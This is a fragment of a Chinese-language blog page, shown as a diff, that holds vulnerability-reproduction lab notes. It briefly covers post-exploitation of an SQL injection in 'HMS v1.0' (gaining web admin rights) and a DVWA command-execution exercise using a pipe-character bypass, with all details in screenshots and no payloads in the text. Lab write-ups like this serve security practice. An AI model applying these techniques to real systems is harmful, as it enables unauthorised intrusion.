+<h4 id="4-数据库连接"><a href="#4-数据库连接" class="headerlink" title="4.数据库连接"></a>4.数据库连接</h4><p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/6.png" alt="6"></p>
+<p>5.后利用</p>
+<p>拿到web管理权限<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/7.png" alt="7"></p>
+<p><img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/HMSv1.0SQL%E6%B3%A8%E5%85%A5/8.png" alt="8"></p>
+<h4 id="十七、DVWA"><a href="#十七、DVWA" class="headerlink" title="十七、DVWA"></a>十七、DVWA</h4><h4 id="命令执行-3"><a href="#命令执行-3" class="headerlink" title="命令执行"></a>命令执行</h4><p>impossible改low，尝试impossible失败<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/DVWA/1.png" alt="1"></p>
+<p>管道符绕过<img src="/images/%E5%A4%AA%E9%98%BF%E5%B9%B3%E5%8F%B0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/DVWA/2.png" alt="2"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2024 - 2025 Alice01
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;Alice01
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
